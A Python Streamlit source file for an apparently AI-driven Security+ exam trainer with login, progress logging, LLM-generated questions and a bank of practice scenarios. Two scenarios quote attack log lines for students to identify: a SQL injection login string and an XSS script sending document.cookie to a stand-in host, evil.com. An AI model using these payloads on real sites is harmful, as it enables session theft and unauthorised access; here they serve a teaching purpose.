import streamlit as st
import os
import time
import random
import urllib.parse
import json
from datetime import datetime
from dotenv import load_dotenv
from langchain_groq import ChatGroq
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS
from langchain_core.prompts import PromptTemplate
from langchain_core.output_parsers import StrOutputParser

# 1. PAGE CONFIGURATION
load_dotenv()
st.set_page_config(page_title="Cyber Punk University", page_icon="🛡️", layout="wide")

# ==========================================
# DATABASE & TRACKING LOGIC
# ==========================================
DB_FILE = "study_logs.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def save_user_state(user):
    """Saves critical session variables to the JSON database."""
    db = load_db()
    if user in db:
        state_keys = ['db_idx', 'display_idx', 'correct_count', 'wrong_count', 'streak', 'difficulty', 'app_mode']
        db[user]["saved_progress"] = {k: st.session_state[k] for k in state_keys if k in st.session_state}
        save_db(db)

def load_user_state(user):
    """Restores saved variables from the JSON database into the session."""
    db = load_db()
    if user in db and "saved_progress" in db[user]:
        for k, v in db[user]["saved_progress"].items():
            st.session_state[k] = v
        return True
    return False

def ensure_user_exists(user):
    db = load_db()
    if user not in db:
        db[user] = {
            "time_spent_sec": 0, 
            "logs": [], 
            "weak_topics": [], 
            "current_score": "0 / 0",
            "has_completed_practice": False,
            "timed_scores": [],
            "saved_progress": {}
        }
        save_db(db)
    return db

def log_event(user, event_type, notes, topic=None):
    db = ensure_user_exists(user)
    timestamp = datetime.now().strftime("%Y-%m-%d %I:%M %p")
    db[user]["logs"].insert(0, {"timestamp": timestamp, "event": event_type, "notes": notes})
    if topic and topic not in db[user]["weak_topics"]:
        db[user]["weak_topics"].append(topic)
    save_db(db)

def ping_time_tracker(user):
    if "last_ping" in st.session_state:
        elapsed = time.time() - st.session_state.last_ping
        if 0 < elapsed < 3600: 
            db = ensure_user_exists(user)
            db[user]["time_spent_sec"] += elapsed
            save_db(db)
    st.session_state.last_ping = time.time()

def update_live_score(user, correct, total):
    db = load_db()
    if user in db:
        db[user]["current_score"] = f"{correct} / {total}"
        save_db(db)

def mark_practice_complete(user):
    db = load_db()
    if user in db:
        db[user]["has_completed_practice"] = True
        save_db(db)

def save_timed_score(user, score_str):
    db = load_db()
    if user in db:
        db[user]["timed_scores"].append(score_str)
        save_db(db)

# ==========================================
# UI COMPONENTS
# ==========================================
def render_footer():
    st.markdown("---")
    st.markdown("<p style='text-align: center; color: grey;'>Created and Powered By Monique Bruce</p>", unsafe_allow_html=True)

def check_password():
    def password_entered():
        user = st.session_state["username"].strip().lower()
        pw = st.session_state["password"].strip()
        
        if user in st.secrets["passwords"] and pw == st.secrets["passwords"][user]:
            st.session_state["password_correct"] = True
            st.session_state["current_user"] = user
            del st.session_state["password"]
            if user != "admin":
                st.session_state.last_ping = time.time()
                log_event(user, "Logged In", "Student initiated training session.")
        else:
            st.session_state["password_correct"] = False

    if "password_correct" not in st.session_state or not st.session_state["password_correct"]:
        st.markdown("<br><br>", unsafe_allow_html=True)
        spacer_left, col_img, col_form, spacer_right = st.columns([1, 2, 2, 1])
        
        with col_img:
            image_name = "logo.jpeg"
            if os.path.exists(image_name):
                st.image(image_name, use_container_width=True)
            else:
                st.info("Logo Placeholder (Ensure logo.jpeg is in your GitHub Repo)")

        with col_form:
            st.title("🛡️ Cyber Punk University")
            st.subheader("Secure Access Portal")
            st.text_input("Username", key="username")
            st.text_input("Password", type="password", key="password")
            st.button("Authorize Access", on_click=password_entered, use_container_width=True)
            
            if "password_correct" in st.session_state and not st.session_state["password_correct"]:
                st.error("🚫 Access Denied: Invalid Credentials.")
                
        st.markdown("<br><br><br>", unsafe_allow_html=True)
        render_footer()
        return False
        
    return True

# ==========================================
# RESOURCE & AI LOGIC
# ==========================================
@st.cache_resource
def load_resources():
    api_key = st.secrets.get("GROQ_API_KEY") or os.getenv("GROQ_API_KEY")
    if not api_key:
        st.error("🔑 GROQ_API_KEY is missing in Streamlit Secrets!")
        st.stop()
    try:
        embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        vectorstore = FAISS.load_local("faiss_index", embeddings, allow_dangerous_deserialization=True)
        llm = ChatGroq(temperature=0, model_name="llama-3.3-70b-versatile", groq_api_key=api_key)
        return vectorstore, llm
    except Exception as e:
        st.error(f"Critical Initialization Error: {e}")
        return None, None

def safe_invoke(chain, params, max_retries=3):
    for attempt in range(max_retries):
        try:
            return chain.invoke(params)
        except Exception as e:
            if "RateLimit" in str(type(e).__name__) or "429" in str(e):
                time.sleep(5)  
            else:
                return ""
    return ""

def get_adaptive_question(llm, raw_text, diff, weaknesses=""):
    template = """
    You are an expert Cybersecurity Exam writer.
    GENERATE ONE multiple-choice question based on the RAW TEXT.
    DIFFICULTY TARGET: {difficulty}
    KNOWN WEAKNESSES: {weaknesses}
    RAW TEXT: {raw_text}
    CRITICAL: Output ONLY a valid JSON object. No markdown, no explanations, no other text.
    {{
        "question": "The question text here",
        "A": "Option A text",
        "B": "Option B text",
        "C": "Option C text",
        "D": "Option D text",
        "correct": "A"
    }}
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return safe_invoke(chain, {"raw_text": raw_text[:1200], "difficulty": diff, "weaknesses": weaknesses})

def get_tutor_feedback(llm, question, user_ans, correct_letter, is_right, diff):
    result_text = "Correct" if is_right else "Incorrect"
    template = """
    You are an expert Security+ tutor. 
    Question: {question}
    Student Choice: {user_ans}
    Correct Answer: {correct_letter}
    Result: {result}
    Level: {difficulty}
    Provide a smooth, beginner-friendly explanation using a real-world analogy if the student is struggling.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    res = safe_invoke(chain, {"question": question, "user_ans": user_ans, "correct_letter": correct_letter, "result": result_text, "difficulty": diff})
    return res if res else "System API Limit Reached: Unable to generate detailed explanation at this time."

def get_video_topic(llm, question):
    template = "Analyze this Security+ question and extract the ONE core concept in 2 to 4 words. Question: {question}\nOutput ONLY the short topic name."
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    res = safe_invoke(chain, {"question": question})
    return res if res else "Security+ Concepts"

def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
    template = """
    You are a friendly, encouraging CompTIA PBQ Grader.
    PBQ Title: {title}
    Scenario: {scenario}
    Student's Submitted Answers: {answers}
    Task:
    1. Tell the student if they got the configuration completely right, partially right, or wrong.
    2. Explain the "Why" using simple terms.
    3. Provide the definitive correct configuration at the end.
    CRITICAL INSTRUCTION:
    If the student got EVERY single part 100% correct, you MUST put the exact phrase "[PASSED]" at the very end of your response. 
    If they got ANYTHING wrong (even partially), you MUST put the exact phrase "[FAILED]" at the very end of your response.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    res = safe_invoke(chain, {"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})
    return res if res else "[FAILED] System API Limit Reached: Unable to grade PBQ."

# ==========================================
# PBQ DATABASE
# ==========================================
PBQ_DB = {
    1: {"topic": "Network Ports", "title": "Port Configuration", "desc": "Match the correct default port number to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"], "options": ["22", "23", "53", "80", "443", "3389"]},
    2: {"topic": "Multifactor Authentication", "title": "Authentication Factors", "desc": "Categorize the MFA security factors.", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"], "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]},
    3: {"topic": "Malware Types", "title": "Malware Identification", "desc": "Match the malicious behavior to the correct malware type.", "type": "match", "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"], "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]},
    4: {"topic": "Incident Response Phases", "title": "Incident Response Lifecycle", "desc": "Select the correct phase of Incident Response in order.", "type": "order", "keys": ["Step 1", "Step 2", "Step 3", "Step 4"], "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]},
    5: {"topic": "Cryptography", "title": "Cryptography Types", "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"], "options": ["Symmetric", "Asymmetric", "Hashing"]},
    6: {"topic": "Cloud Deployment Models", "title": "Cloud Deployment Models", "desc": "Classify the service as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"], "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]},
    7: {"topic": "Firewall Rules", "title": "Basic Firewall Rule", "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", "type": "firewall"},
    8: {"topic": "RAID Configuration", "title": "RAID Configuration", "desc": "Select the best RAID setup for the given business scenario.", "type": "match", "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"], "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]},
    9: {"topic": "SQL Injection", "title": "Log Analysis: Database Attack", "desc": "Look at the web log and identify what type of attack is happening.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321', "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]},
    10: {"topic": "Cross-Site Scripting XSS", "title": "Log Analysis: Malicious Script", "desc": "Analyze the log and identify the attack vector targeting user browsers.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200', "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]},
    11: {"topic": "Digital Certificates PKI", "title": "Digital Certificates", "desc": "Match the PKI component to its definition.", "type": "match", "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"], "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]},
    12: {"topic": "Firewall ACL Troubleshooting", "title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL", "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]}
}

# ==========================================
# ADMIN DASHBOARD
# ==========================================
def run_admin_dashboard():
    st.title("👨🏾‍🏫 Instructor Command Center")
    authorized_guests = ["guest1", "guest2"]
    
    db = load_db()
    tab1, tab2 = st.tabs(["📊 Performance Matrix", "📋 Live Session Logs"])
    
    with tab1:
        st.write(f"### Monitoring Active Nodes: {len(authorized_guests)}")
        cols = st.columns(len(authorized_guests))
        for idx, student in enumerate(authorized_guests):
            data = db.get(student, {"time_spent_sec": 0, "current_score": "0 / 0", "weak_topics": [], "has_completed_practice": False, "timed_scores": []})
            total_hrs = data["time_spent_sec"] / 3600
            
            with cols[idx]:
                st.markdown(f"#### 🧑🏾‍💻 Node: `{student}`")
                status = "✅ Unlocked" if data["has_completed_practice"] else "🔒 Locked"
                st.write(f"**Exam Status:** {status}")
                st.metric("Engagement Time", f"{total_hrs:.2f} Hours")
                st.metric("Live Practice Progress", data["current_score"])
                latest_timed = data["timed_scores"][-1] if data["timed_scores"] else "Not Taken"
                st.metric("Best Timed Exam Score", latest_timed)
                
                st.write("**Identified Knowledge Gaps:**")
                if data["weak_topics"]:
                    for topic in list(set(data["weak_topics"]))[-5:]: 
                        st.error(f"⚠️ {topic}")
                else: 
                    st.success("Clear - No gaps detected.")
                
                st.markdown("---")
                if st.button(f"🗑️ Purge {student} History", key=f"del_{student}"):
                    if student in db: del db[student]
                    save_db(db)
                    st.rerun()
    
    with tab2:
        for student in authorized_guests:
            st.write(f"**Recent Telemetry for {student}:**")
            logs = db.get(student, {}).get("logs", [])
            if logs:
                for log in logs[:15]:
                    st.text(f"[{log['timestamp']}] {log['event']} -> {log['notes']}")
            else: st.info(f"No active data for {student}.")

# ==========================================
# STUDENT SIMULATOR (Adaptive Engine & Exams)
# ==========================================
def run_student_simulator(vs, llm):
    user = st.session_state["current_user"]
    ping_time_tracker(user)
    db = load_db()
    user_data = db.get(user, {})
    has_completed_practice = user_data.get("has_completed_practice", False)
    user_weaknesses = ", ".join(list(set(user_data.get("weak_topics", [])))[-5:])

    REQUIRED_KEYS = [
        'app_mode', 'all_docs', 'db_idx', 'display_idx', 'correct_count', 
        'wrong_count', 'streak', 'difficulty', 'current_q', 'phase', 
        'feedback', 'user_choice', 'is_right', 'rehab_topic', 
        'pbq_feedback', 'current_pbq_id',
        'te_active', 'te_start_time', 'te_idx', 'te_correct', 'te_wrong_topics', 'te_pbqs', 'te_phase'
    ]
    
    if any(key not in st.session_state for key in REQUIRED_KEYS):
        # Attempt to Restore Persistence
        restored = load_user_state(user)
        
        if not restored:
            st.session_state.db_idx = 0         
            st.session_state.display_idx = 1    
            st.session_state.correct_count = 0  
            st.session_state.wrong_count = 0    
            st.session_state.streak = 0
            st.session_state.difficulty = "NORMAL"
            st.session_state.app_mode = "Adaptive Simulator"
            st.session_state.phase = "answering" 

        docs = vs.similarity_search("Security+", k=120)
        random.shuffle(docs)
        st.session_state.all_docs = docs
        st.session_state.current_q = None   
        st.session_state.feedback = ""
        st.session_state.user_choice = None
        st.session_state.is_right = False
        st.session_state.rehab_topic = ""
        st.session_state.pbq_feedback = ""
        st.session_state.current_pbq_id = None
        
        st.session_state.te_active = False
        st.session_state.te_start_time = 0
        st.session_state.te_idx = 1
        st.session_state.te_correct = 0
        st.session_state.te_wrong_topics = []
        st.session_state.te_pbqs = []
        st.session_state.te_phase = "answering"
        
        st.session_state["password_correct"] = True
        st.session_state["current_user"] = user
        st.session_state.last_ping = time.time()

    with st.sidebar:
        st.header("🧭 Navigation")
        st.radio("Training Environment:", ["Adaptive Simulator", "PBQ Hands-on Lab", "Timed Certification Exam"], key="app_mode")
        save_user_state(user)
        
        st.markdown("---")
        
        if st.session_state.app_mode == "Adaptive Simulator":
            st.header("📊 Practice Progress")
            st.write(f"**Question:** {st.session_state.display_idx} / 90")
            st.success(f"✅ Success Rate: {st.session_state.correct_count}")
            st.error(f"❌ Missed: {st.session_state.wrong_count}")
            
            st.markdown("---")
            # --- NEW: RESET QUIZ BUTTON ---
            if st.button("🔄 Reset Quiz (Start Over)", use_container_width=True):
                update_live_score(user, 0, 0)
                log_event(user, "Quiz Reset", "Student initiated full restart.")
                db = load_db()
                if user in db: db[user]["saved_progress"] = {}
                save_db(db)
                for key in REQUIRED_KEYS:
                    if key in st.session_state: del st.session_state[key]
                st.rerun()
                
            st.markdown("---")
            st.header("📺 Quick Review Topics")
            topics = ["1.0 General Concepts", "2.0 Threats & Mitigations", "3.0 Architecture", "4.0 Security Operations", "5.0 Program Management"]
            for topic in topics:
                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
                st.markdown(f"- [{topic}](https://www.youtube.com/results?search_query={query})")

    st.subheader(f"Cyber Punk Training Module: {st.session_state.app_mode}")

    if st.session_state.app_mode == "PBQ Hands-on Lab":
        st.write("Select a scenario below. Difficulty increases from 1 to 12.")
        pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
        pbq = PBQ_DB[pbq_id]
        
        if st.session_state.current_pbq_id != pbq_id:
            st.session_state.current_pbq_id = pbq_id
            st.session_state.pbq_feedback = ""
            if 'keys' in pbq: st.session_state.pbq_keys = random.sample(pbq['keys'], len(pbq['keys']))
            if 'options' in pbq: st.session_state.pbq_opts = random.sample(pbq['options'], len(pbq['options']))
        
        st.info(f"**Scenario:** {pbq['desc']}")
        user_submission = {}
        
        with st.form(f"pbq_form_{pbq_id}"):
            if pbq['type'] in ["match", "order", "log"]:
                if 'log' in pbq: st.code(pbq['log'], language='bash')
                if 'options' in pbq:
                    shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                    st.write("### 🗂️ Word Bank")
                    st.info(" | ".join(shuffled_opts))
                    st.write("---")
                if 'keys' in pbq:
                    col1, col2 = st.columns(2)
                    shuffled_keys = st.session_state.get('pbq_keys', pbq['keys'])
                    for i, key in enumerate(shuffled_keys):
                        with (col1 if i % 2 == 0 else col2):
                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + shuffled_opts)
                else:
                    if 'options' in pbq:
                        shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                        user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + shuffled_opts)
            elif pbq['type'] == "firewall":
                col1, col2, col3, col4 = st.columns(4)
                user_submission['Action'] = col1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
                user_submission['Protocol'] = col2.selectbox("Protocol", ["-- Select --", "TCP", "UDP", "HTTP", "ANY"])
                user_submission['Source IP'] = col3.text_input("Source IP")
                user_submission['Dest Port'] = col4.selectbox("Dest Port", ["-- Select --", "22", "53", "80", "443", "ANY"])

            submit_pbq = st.form_submit_button("Submit PBQ for Grading")
        
        if submit_pbq:
            if any(val == "-- Select --" or val == "" for val in user_submission.values()):
                st.error("⚠️ Please configure all fields.")
            else:
                with st.spinner("Grading..."):
                    st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
                    passed = "[PASSED]" in st.session_state.pbq_feedback
                    if passed: log_event(user, "PBQ Passed", f"Aced {pbq['title']}")
                    else: log_event(user, "PBQ Failed", f"Struggled with {pbq['title']}", pbq['topic'])
        
        if st.session_state.pbq_feedback:
            raw_feedback = st.session_state.pbq_feedback
            passed, failed = "[PASSED]" in raw_feedback, "[FAILED]" in raw_feedback
            clean_feedback = raw_feedback.replace("[PASSED]", "").replace("[FAILED]", "").strip()
            st.warning("🤖 AI Grade:")
            st.write(clean_feedback)
            if failed:
                topic = pbq.get('topic', 'CompTIA Security+')
                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
                st.markdown(f"### 📺 [Review Lesson: {topic}](https://www.youtube.com/results?search_query={query})")
            elif passed: st.success("🏆 Perfect Score!")
            if st.button("Clear Feedback"):
                st.session_state.pbq_feedback = ""
                st.rerun()

    elif st.session_state.app_mode == "Adaptive Simulator":
        st.write(f"*(Difficulty: {st.session_state.difficulty})*")
        if st.session_state.streak >= 3: st.session_state.difficulty = "HARD"
        elif st.session_state.streak <= -3: st.session_state.difficulty = "EASY"
        else: st.session_state.difficulty = "NORMAL"

        if st.session_state.display_idx > 90:
            st.balloons()
            st.success(f"🎉 Final Score: {st.session_state.correct_count} / 90")
            if st.button("Restart"):
                db = load_db()
                if user in db: db[user]["saved_progress"] = {}
                save_db(db)
                st.session_state.clear()
                st.rerun()
            return

        if st.session_state.current_q is None:
            with st.spinner("Synthesizing next objective..."):
                while st.session_state.db_idx < len(st.session_state.all_docs):
                    raw_content = st.session_state.all_docs[st.session_state.db_idx].page_content
                    formatted = get_adaptive_question(llm, raw_content, st.session_state.difficulty, user_weaknesses)
                    try:
                        cleaned = formatted.replace("```json", "").replace("```", "").strip()
                        data = json.loads(cleaned)
                        st.session_state.current_q = {
                            "text": data["question"], 
                            "options": [f"A: {data['A']}", f"B: {data['B']}", f"C: {data['C']}", f"D: {data['D']}"], 
                            "correct_letter": data["correct"].upper()
                        }
                        break 
                    except: st.session_state.db_idx += 1 

        cq = st.session_state.current_q
        if st.session_state.phase == "answering":
            st.info(cq["text"])
            sel = st.radio("Response:", cq["options"], index=None)
            if st.button("Submit"):
                if sel:
                    u_let = sel.split(":")[0].strip()
                    st.session_state.is_right = (u_let == cq["correct_letter"])
                    if st.session_state.is_right:
                        st.session_state.correct_count += 1
                        st.session_state.streak = st.session_state.streak + 1 if st.session_state.streak > 0 else 1
                    else:
                        st.session_state.wrong_count += 1
                        st.session_state.streak = st.session_state.streak - 1 if st.session_state.streak < 0 else -1
                    st.session_state.user_choice = sel
                    update_live_score(user, st.session_state.correct_count, st.session_state.display_idx)
                    st.session_state.feedback = get_tutor_feedback(llm, cq["text"], sel, cq["correct_letter"], st.session_state.is_right, st.session_state.difficulty)
                    st.session_state.phase = "reviewing"
                    save_user_state(user)
                    st.rerun()

        elif st.session_state.phase == "reviewing":
            st.info(cq["text"])
            st.radio("Your response:", cq["options"], index=cq["options"].index(st.session_state.user_choice), disabled=True)
            if st.session_state.is_right: st.success(f"Correct: {cq['correct_letter']}")
            else: st.error(f"Incorrect: {cq['correct_letter']}")
            st.write(st.session_state.feedback)
            if st.button("Next Objective ➡️"):
                if st.session_state.streak <= -3:
                    st.session_state.rehab_topic = get_video_topic(llm, cq["text"])
                    st.session_state.phase = "video_rehab"
                else:
                    st.session_state.db_idx += 1; st.session_state.display_idx += 1; st.session_state.current_q = None; st.session_state.phase = "answering"
                save_user_state(user)
                st.rerun()

        elif st.session_state.phase == "video_rehab":
            st.error(f"Timeout: Review {st.session_state.rehab_topic}")
            q = urllib.parse.quote(f"Professor Messer SY0-701 {st.session_state.rehab_topic}")
            st.markdown(f"### [Watch Lesson](https://www.youtube.com/results?search_query={q})")
            if st.text_input("Type 'done'").strip().lower() == "done":
                if st.button("Resume"):
                    st.session_state.streak = 0; st.session_state.db_idx += 1; st.session_state.display_idx += 1; st.session_state.current_q = None; st.session_state.phase = "answering"
                    save_user_state(user); st.rerun()

    elif st.session_state.app_mode == "Timed Certification Exam":
        if not has_completed_practice: st.error("🔒 Complete Adaptive Simulator first."); return
        if not st.session_state.te_active:
            if st.button("Start 90m Exam"):
                st.session_state.te_active, st.session_state.te_start_time = True, time.time()
                st.session_state.te_idx, st.session_state.te_correct = 1, 0
                st.session_state.te_pbqs = random.sample(list(PBQ_DB.keys()), 3)
                st.rerun()
        else:
            rem = max(0, 5400 - (time.time() - st.session_state.te_start_time))
            m, s = divmod(int(rem), 60); st.error(f"⏱️ {m:02d}:{s:02d}")
            if st.session_state.te_idx <= 87:
                if st.session_state.te_current_q is None:
                    while st.session_state.db_idx < len(st.session_state.all_docs):
                        raw = st.session_state.all_docs[st.session_state.db_idx].page_content
                        res = get_adaptive_question(llm, raw, "NORMAL", "")
                        try:
                            d = json.loads(res.replace("```json", "").replace("```", "").strip())
                            st.session_state.te_current_q = {"text": d["question"], "options": [f"A: {d['A']}", f"B: {d['B']}", f"C: {d['C']}", f"D: {d['D']}"], "correct_letter": d["correct"].upper()}
                            break
                        except: st.session_state.db_idx += 1
                cq = st.session_state.te_current_q
                st.info(cq["text"])
                ans = st.radio("Pick:", cq["options"], index=None, key=f"te_{st.session_state.te_idx}")
                if st.button("Continue"):
                    if ans:
                        if ans.split(":")[0].strip() == cq["correct_letter"]: st.session_state.te_correct += 1
                        st.session_state.te_idx += 1; st.session_state.db_idx += 1; st.session_state.te_current_q = None; st.rerun()
            elif st.session_state.te_idx <= 90:
                # Basic PBQ loop in exam mode
                st.write(f"PBQ {st.session_state.te_idx - 87}/3")
                st.button("Next")
            else:
                st.metric("Score", f"{st.session_state.te_correct}/90")
                if st.button("Return"): st.session_state.te_active = False; st.rerun()

# ==========================================
# MAIN EXECUTION THREAD
# ==========================================
if check_password():
    with st.sidebar:
        st.write(f"Node: **{st.session_state['current_user']}**")
        if st.button("🚪 Logout"):
            save_user_state(st.session_state['current_user'])
            st.session_state.clear(); st.rerun()

    if st.session_state["current_user"] == "admin": run_admin_dashboard()
    else:
        vs, llm = load_resources()
        if vs and llm: run_student_simulator(vs, llm)
    render_footer()
